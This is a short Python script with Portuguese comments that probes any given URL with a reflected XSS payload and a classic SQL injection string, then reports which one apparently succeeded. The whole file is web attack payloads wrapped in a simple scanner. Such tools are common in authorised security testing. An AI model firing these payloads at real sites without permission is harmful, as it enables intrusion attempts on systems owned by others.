import requests

def attempt_exploits(url, session=None):
    results = []
    sess = session or requests

    try:
        # Tentativa de XSS
        xss_url = url + "?msg=<script>alert('x')</script>"
        xss_resp = sess.get(xss_url, timeout=5)
        if "<script>alert('x')</script>" in xss_resp.text:
            results.append("XSS bem-sucedido em: " + xss_url)

        # Tentativa de SQL Injection
        sqli_url = url + "?id=1' OR '1'='1"
        sqli_resp = sess.get(sqli_url, timeout=5)
        if "login" in sqli_resp.text.lower() or "admin" in sqli_resp.text.lower():
            results.append("SQLi possível em: " + sqli_url)

    except Exception as e:
        results.append(f"Erro ao tentar exploit: {e}")

    return results